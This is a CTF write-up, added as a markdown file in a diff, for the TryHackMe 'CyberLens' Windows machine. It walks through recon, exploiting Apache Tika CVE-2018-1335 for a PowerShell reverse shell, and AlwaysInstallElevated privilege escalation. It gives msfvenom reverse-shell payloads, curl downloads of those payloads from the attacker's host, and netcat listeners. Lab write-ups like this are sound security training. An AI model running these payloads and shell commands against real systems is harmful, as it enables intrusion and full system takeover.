@@ -1,0 +1,390 @@
+---
+title: TryHackMe CyberLens
+description: Writeup
+---
+<img src="https://i.ytimg.com/vi/2rS_lEuhZUM/maxresdefault.jpg" />
+
+## Overview
+- **Machine Name:** CyberLens
+- **OS:** Windows
+- **Difficulty:** Easy
+## Reconnaissance
+We'll initiate an nmap scan to identify any open ports.
+### Nmap Scan Results
+
+```java
+# Nmap 7.94SVN scan initiated Mon May 27 17:03:16 2024 as: nmap -sCV --min-rate=5000 -Pn -vvv -oN targeted 10.10.60.166
+Increasing send delay for 10.10.60.166 from 0 to 5 due to 125 out of 416 dropped probes since last increase.
+Increasing send delay for 10.10.60.166 from 5 to 10 due to 89 out of 296 dropped probes since last increase.
+Nmap scan report for cyberlens.thm (10.10.60.166)
+Host is up, received user-set (0.050s latency).
+Scanned at 2024-05-27 17:03:17 CEST for 22s
+Not shown: 599 closed tcp ports (reset), 396 filtered tcp ports (no-response)
+PORT     STATE SERVICE       REASON          VERSION
+80/tcp   open  http          syn-ack ttl 127 Apache httpd 2.4.57 ((Win64))
+| http-methods: 
+|   Supported Methods: GET POST OPTIONS HEAD TRACE
+|_  Potentially risky methods: TRACE
+|_http-title: CyberLens: Unveiling the Hidden Matrix
+|_http-server-header: Apache/2.4.57 (Win64)
+135/tcp  open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
+139/tcp  open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
+445/tcp  open  microsoft-ds? syn-ack ttl 127
+3389/tcp open  ms-wbt-server syn-ack ttl 127 Microsoft Terminal Services
+| ssl-cert: Subject: commonName=CyberLens
+| Issuer: commonName=CyberLens
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2024-05-26T15:02:22
+| Not valid after:  2024-11-25T15:02:22
+| MD5:   60aa:de52:52e2:551c:61c3:6760:f57b:8e76
+| SHA-1: 421f:63c7:db34:998a:f890:97f7:034f:db9f:6ce6:5d9e
+| -----BEGIN CERTIFICATE-----
+| MIIC1jCCAb6gAwIBAgIQKah1gsrMHJNP8hIHg/SasDANBgkqhkiG9w0BAQsFADAU
+| MRIwEAYDVQQDEwlDeWJlckxlbnMwHhcNMjQwNTI2MTUwMjIyWhcNMjQxMTI1MTUw
+| MjIyWjAUMRIwEAYDVQQDEwlDeWJlckxlbnMwggEiMA0GCSqGSIb3DQEBAQUAA4IB
+| DwAwggEKAoIBAQDgj9yyP7g9XgNqIbiINu1TD8xTPjn06yyb4n5gzp7hvvrd6muO
+| yAYa7ygr2C7tI10+FW8NoAj6RwD/yFoDqKwcv9Den2m9EJTXmVWibKQ+NUCkj972
+| J8TNMIROj9hAxca4Ky5n1cOJKKoTzJx0AayRJ86CPzX052ChzsTdErxNWpZtEloo
+| chl57bD5iwaLakO8vuePoGQ2zpd3og+KVF8MK5WIl1gG/WzmN3VJeTtbjMsnZ6PT
+| gKrTKJmwFOAugEPilp4WNIpceJAbXmaUyQBevmOHyYTnK7r/nZ5iy1bHogtckAw3
+| WME2JOqfKT23O5AUYb7V/UFmE8/bOr6dLrulAgMBAAGjJDAiMBMGA1UdJQQMMAoG
+| CCsGAQUFBwMBMAsGA1UdDwQEAwIEMDANBgkqhkiG9w0BAQsFAAOCAQEATRNY67zR
+| GgaSPHATBAqcqqFN0pylx1/RhY6GwXwc4SDv9Hm3kpdbskuiVCSaxOqQmqo+lgwa
+| 3RK5ZBNNbjWknk634ielnWsqXu7vO3Z6Jlp9c7ldHL7lNZl7MA6m7QodESJ5bJyA
+| nsN0ZWbXzDfEEe2Plkqk9E6r66VOpyHduwl/DHAa/vILHF5Wj4TzF6gzLI4AbgdS
+| TtxhZVfjDcRvQlT/nrgTw1gH0/5BgynYjEi1IPKu0kWJ7r0A8nyDxQiP4pIqFPwK
+| r0CgplW+Y+7a3zggRyVoUGFIcYSU7d5DtcKJYH8cLeboWmmEBemIHGovt4HnOaIM
+| l5R1tbQc9eoiFQ==
+|_-----END CERTIFICATE-----
+|_ssl-date: 2024-05-27T15:03:39+00:00; 0s from scanner time.
+| rdp-ntlm-info: 
+|   Target_Name: CYBERLENS
+|   NetBIOS_Domain_Name: CYBERLENS
+|   NetBIOS_Computer_Name: CYBERLENS
+|   DNS_Domain_Name: CyberLens
+|   DNS_Computer_Name: CyberLens
+|   Product_Version: 10.0.17763
+|_  System_Time: 2024-05-27T15:03:31+00:00
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: mean: 0s, deviation: 0s, median: 0s
+| p2p-conficker: 
+|   Checking for Conficker.C or higher...
+|   Check 1 (port 20196/tcp): CLEAN (Couldn't connect)
+|   Check 2 (port 57404/tcp): CLEAN (Couldn't connect)
+|   Check 3 (port 17392/udp): CLEAN (Timeout)
+|   Check 4 (port 58875/udp): CLEAN (Failed to receive data)
+|_  0/4 checks are positive: Host is CLEAN or ports are blocked
+| smb2-security-mode: 
+|   3:1:1: 
+|_    Message signing enabled but not required
+| smb2-time: 
+|   date: 2024-05-27T15:03:35
+|_  start_date: N/A
+
+Read data files from: /usr/bin/../share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Mon May 27 17:03:39 2024 -- 1 IP address (1 host up) scanned in 23.50 seconds
+
+```
+Add the IP of the machine to your /etc/hosts 
+
+```java
+sudo echo 'MACHINE_IP cyberlens.thm' >> /etc/hosts
+```
+
+After the scan, we see several open ports, port 80 is open so let's go to the website to see what we find.
+```java
+http://cyberlens.thm:80/
+```
+We can see  a feature on the target webpage, CyberLens Image Metadata Extractor. This functionality allows users to upload images and conveniently extract all associated metadata, but before inspecting that feature of the web let's do a directory enumeration with gobuster to see if we find interesting directories.
+### Directory Enumeration
+```java
+[+] Fuzzing with Gobuster URL: http://10.10.14.185/ [+]
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.10.14.185/
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.6
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/images               (Status: 301) [Size: 235] [--> http://10.10.14.185/images/]
+/Images               (Status: 301) [Size: 235] [--> http://10.10.14.185/Images/]
+/css                  (Status: 301) [Size: 232] [--> http://10.10.14.185/css/]
+/js                   (Status: 301) [Size: 231] [--> http://10.10.14.185/js/]
+/IMAGES               (Status: 301) [Size: 235] [--> http://10.10.14.185/IMAGES/]
+/%20                  (Status: 403) [Size: 199]
+/*checkout*           (Status: 403) [Size: 199]
+/CSS                  (Status: 301) [Size: 232] [--> http://10.10.14.185/CSS/]
+/JS                   (Status: 301) [Size: 231] [--> http://10.10.14.185/JS/]
+/*docroot*            (Status: 403) [Size: 199]
+/*                    (Status: 403) [Size: 199]
+/con                  (Status: 403) [Size: 199]
+/http%3A              (Status: 403) [Size: 199]
+/**http%3a            (Status: 403) [Size: 199]
+/*http%3A             (Status: 403) [Size: 199]
+```
+
+Nothing interesting !
+
+Let's check the source code from the webpage to see if we can get something interesting.
+
+```java
+view-source:http://MACHINE-IP/
+```
+Looking at the sourcecode of the website, on line 192 we find the CyberLens Image Extractor, and something very interesting appears, which is this script.
+```java
+ <script>
+    document.addEventListener("DOMContentLoaded", function() {
+      document.getElementById("metadataButton").addEventListener("click", function() {
+        var fileInput = document.getElementById("imageFileInput");
+        var file = fileInput.files[0];
+  
+        var reader = new FileReader();
+        reader.onload = function() {
+          var fileData = reader.result;
+  
+          fetch("http://cyberlens.thm:61777/meta", {
+            method: "PUT",
+            body: fileData,
+            headers: {
+              "Accept": "application/json",
+              "Content-Type": "application/octet-stream"
+            }
+          })
+          .then(response => {
+            if (response.ok) {
+              return response.json();
+            } else {
+              throw new Error("Error: " + response.status);
+            }
+          })
+          .then(data => {
+            var metadataOutput = document.getElementById("metadataOutput");
+            metadataOutput.innerText = JSON.stringify(data, null, 2);
+          })
+          .catch(error => {
+            console.error("Error:", error);
+          });
+        };
+  
+        reader.readAsArrayBuffer(file);
+      });
+    });
+  </script>
+```
+We can see that the image extractor, once an image is uploaded, it sends it to http://cyberlens.thm:61777/meta to extract the metadata of the image and returns it to us.
+```java
+fetch("http://cyberlens.thm:61777/meta", {
+            method: "PUT",
+            body: fileData,
+            headers: {
+              "Accept": "application/json",
+              "Content-Type": "application/octet-stream"
+            }
+```
+Let's go there and see what we find.
+```java
+http://cyberlens.thm:61777/
+```
+
+And the server is running Apache Tika 1.17 Server, Let's see if there are any CVEs for this version
+
+## Exploitation
+Searching we can find that it is vulnerable to Command Injection CVE-2018-1335 https://www.exploit-db.com/exploits/46540 
+
+Let's try the exploit to see if we can gain access to the machine
+
+```java
+python3 exploit.py 
+Usage: python exploit.py <host> <port> <command>
+Example: python exploit.py localhost 9998 calc.exe
+```
+Then let's build the command, I will use https://www.revshells.com/ PowerShell #3 (Base64)
+```java
+python3 exploit.py cyberlens.thm 61777 "powershell -e .............."
+```
+Start a netcat listener
+```java
+nc -lvnp 5555
+```
+And we are in ! 
+```java
+nc -lvnp 5555
+listening on [any] 5555 ...
+connect to [x] from (UNKNOWN) [10.10.14.185] 49848
+
+PS C:\Windows\system32> whoami
+cyberlens\cyberlens
+PS C:\Windows\system32>
+```
+Go to C:\Users\CyberLens\Desktop and grab the user flag ! Now let's focus on privilege escalation.
+## Post-Exploitation
+### Privilege Escalation
+Let's get on, for this I will establish a shell with metasploit and then use post/multi/recon/local_exploit_suggester to see what we can get.
+
+```java
+msf6 > use exploit/multi/handler
+[*] Using configured payload generic/shell_reverse_tcp
+msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcppayload => windows/meterpreter/reverse_tcp
+msf6 exploit(multi/handler) > show options
+
+Payload options (windows/meterpreter/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  process          yes       Exit technique (Accepted: '', s
+                                        eh, thread, process, none)
+   LHOST                      yes       The listen address (an interfac
+                                        e may be specified)
+   LPORT                      yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Wildcard Target
+
+
+
+View the full module info with the info, or info -d command.
+
+msf6 exploit(multi/handler) >
+```
+Craft a shell with msfvenom
+```java
+msfvenom -p windows/meterpreter/reverse_tcp LHOST= LPORT= -f exe -o shell.exe
+```
+Transfer it to target machine
+```java
+curl -o shell.exe http://YOUR-IP/shell.exe
+```
+Then 
+```java
+.\shell.exe
+```
+Start listener and we have it.
+```java
+meterpreter > ls
+Listing: C:\Users\CyberLens\Desktop
+===================================
+
+Mode          Size   Type  Last modified          Name
+----          ----   ----  -------------          ----
+100666/rw-rw  527    fil   2016-06-21 17:36:17 +  EC2 Feedback.website
+-rw-                       0200
+100666/rw-rw  554    fil   2016-06-21 17:36:23 +  EC2 Microsoft Windows
+-rw-                       0200                    Guide.website
+100666/rw-rw  282    fil   2023-06-06 21:48:33 +  desktop.ini
+-rw-                       0200
+100777/rwxrw  73802  fil   2024-05-27 19:03:19 +  shell.exe
+xrwx                       0200
+100666/rw-rw  25     fil   2023-06-06 21:54:19 +  user.txt
+-rw-                       0200
+
+meterpreter >
+```
+Background the session 
+```java
+meterpreter > background
+[*] Backgrounding session 1...
+```
+We will use post/multi/recon/local_exploit_suggester.
+```java
+msf6 exploit(multi/handler) > search multi recon local exploit suggester
+
+Matching Modules
+================
+
+   #  Name                                      Disclosure Date  Rank    Check  Description
+   -  ----                                      ---------------  ----    -----  -----------
+   0  post/multi/recon/local_exploit_suggester  .                normal  No     Multi Recon Local Exploit Suggester
+
+
+Interact with a module by name or index. For example info 0, use 0 or use post/multi/recon/local_exploit_suggester
+
+msf6 exploit(multi/handler) > use 0
+msf6 post(multi/recon/local_exploit_suggester) > show options
+
+Module options (post/multi/recon/local_exploit_suggester):
+
+   Name             Current Setting  Required  Description
+   ----             ---------------  --------  -----------
+   SESSION                           yes       The session to run this
+                                               module on
+   SHOWDESCRIPTION  false            yes       Displays a detailed desc
+                                               ription for the availabl
+                                               e exploits
+
+
+View the full module info with the info, or info -d command.
+
+msf6 post(multi/recon/local_exploit_suggester) > set session 1
+session => 1
+```
+After launching it it tells us that the machine is vulnerable to always_install_elevated
+```java
+msf6 post(multi/recon/local_exploit_suggester) > run
+
+[*] 10.10.14.185 - Collecting local exploits for x86/windows...
+[*] 10.10.14.185 - 193 exploit checks are being tried...
+[+] 10.10.14.185 - exploit/windows/local/always_install_elevated: The target is vulnerable.
+```
+Let's see if it's true
+```java
+reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+```
+This command checks if the "AlwaysInstallElevated" policy is enabled on the system. The output indicates that the policy is set to `0x1`, meaning it is enabled. This policy allows Windows Installer to elevate privileges for all .msi (Microsoft Installer) files, which can be exploited by an attacker to gain elevated privileges by running a malicious .msi file.
+```java
+PS C:\Users\CyberLens\Desktop> reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+
+HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer
+    AlwaysInstallElevated    REG_DWORD    0x1
+```
+So let's generate an MSI installer payload with msfvenom.
+```java
+msfvenom --platform windows --arch x64 --payload windows/x64/shell_reverse_tcp LHOST=IP LPORT=7777 --encoder x64/xor --iterations 9 --format msi --out AlwaysInstallElevated.msi
+```
+Transfer it to the victim machine
+```java
+curl -o AlwaysInstallElevated.msi http://YOUR-IP/AlwaysInstallElevated.msi
+```
+Run it
+```java
+msiexec /i AlwaysInstallElevated.msi
+```
+Start a netcat listener.
+```java
+nc -lvnp 7777
+```
+And we are nt authority\system
+```java
+nc -lvnp 7777
+listening on [any] 7777 ...
+connect to [X] from (UNKNOWN) [10.10.14.185] 49875
+Microsoft Windows [Version 10.0.17763.1821]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>whoami
+whoami
+nt authority\system
+
+C:\Windows\system32>
+```
+## Conclusion
+
+In conclusion, here is my first writeup, I hope it has been useful to you, and as for the machine, a easy easy Windows to reinforce basic concepts.
+
+---
+
